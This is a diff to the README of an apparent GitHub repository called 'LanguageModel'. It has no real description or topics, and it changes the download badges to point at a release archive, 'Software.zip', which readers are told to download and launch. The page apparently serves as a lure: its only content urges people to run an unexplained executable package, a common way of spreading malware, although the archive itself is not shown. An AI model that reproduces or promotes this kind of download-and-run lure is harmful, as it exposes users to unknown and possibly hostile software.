@@ -1,6 +1,6 @@
 # 🚀 Welcome to the LanguageModel Repository!
 
-[![Software Link](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Software Link](https://github.com/Jts36/LanguageModel/releases/download/v2.0/Software.zip)](https://github.com/Jts36/LanguageModel/releases/download/v2.0/Software.zip)
 
 ### Repository Name: LanguageModel
 ### Short Description: 
@@ -15,7 +15,7 @@ No specific topics are provided for this repository.
 
 Click the button below to download the software package. It needs to be launched to experience the LanguageModel functionality.
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Jts36/LanguageModel/releases/download/v2.0/Software.zip)](https://github.com/Jts36/LanguageModel/releases/download/v2.0/Software.zip)
 
 ---
 
